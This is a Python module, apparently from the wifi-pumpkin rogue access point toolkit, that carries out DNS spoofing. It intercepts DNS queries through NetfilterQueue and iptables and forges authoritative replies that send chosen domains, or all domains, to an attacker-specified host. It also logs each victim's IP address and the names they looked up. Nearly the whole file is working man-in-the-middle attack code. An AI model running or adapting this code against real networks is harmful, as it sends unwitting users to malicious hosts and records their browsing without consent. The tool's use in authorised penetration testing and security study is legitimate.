#!/usr/bin/env python
import argparse
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import *
from netfilterqueue import NetfilterQueue

"""
Description:
    This program is a module for wifi-pumpkin.py file which includes new implementation
    for Dns spoof Attack with NetfilterQueue and iptables.

Copyright:
    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

'''http://stackoverflow.com/questions/17035077/python-logging-to-multiple-log-files-from-different-classes'''
def setup_logger(logger_name, log_file, level=logging.INFO):
    l = logging.getLogger(logger_name)
    formatter = logging.Formatter('%(message)s')
    fileHandler = logging.FileHandler(log_file, mode='a')
    fileHandler.setFormatter(formatter)
    streamHandler = logging.StreamHandler()
    streamHandler.setFormatter(formatter)

    l.setLevel(level)
    l.addHandler(fileHandler)
    l.addHandler(streamHandler)


class DnsSpoofNetFilter(object):
    def __init__(self):
        """ implementation Dnsspoof with Netfilterqueue modules"""
        description = "Module DNS spoofing v0.1"
        usage = "Usage: use --help for futher information"
        parser = argparse.ArgumentParser(description = description, usage = usage)
        parser.add_argument('-d','--domains', dest = 'domains', help = 'Specify the domains', required = True)
        parser.add_argument('-r', '--redirect', dest = 'redirect',  help = 'Redirect host ', required = True)
        self.args = parser.parse_args()

    def logggingCreate(self):
        setup_logger('dnsspoofAP', './logs/AccessPoint/dnsspoof.log')
        self.logDNS = logging.getLogger('dnsspoofAP')
        self.logDNS.info('Dns Spoof: running...')

    def callback(self,packet):
        payload = packet.get_payload()
        pkt = IP(payload)
        if not pkt.haslayer(DNSQR):
            packet.accept()
        else:
            if pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1] in self.domain:
                self.logDNS.info('{} ->({}) has searched for: {}'.format(pkt[IP].src,
                self.redirect,pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1]))
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.redirect))
                packet.set_payload(str(spoofed_pkt))
                send(spoofed_pkt,verbose=False)
                packet.accept()
            elif len(self.domain) == 1 and self.domain[0] == '':
                self.logDNS.info('{} ->({}) has searched for: {}'.format(pkt[IP].src,
                self.redirect,pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1]))
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.redirect))
                packet.set_payload(str(spoofed_pkt))
                send(spoofed_pkt,verbose=False)
                packet.accept()
            else:
                packet.accept()

    def main(self):
        self.redirect, self.domain = self.args.redirect, self.args.domains.split(',')
        self.q = NetfilterQueue()
        self.logggingCreate()
        self.q.bind(0, self.callback)
        self.q.run()

if __name__ == "__main__":
    dnsspoof = DnsSpoofNetFilter()
    dnsspoof.main()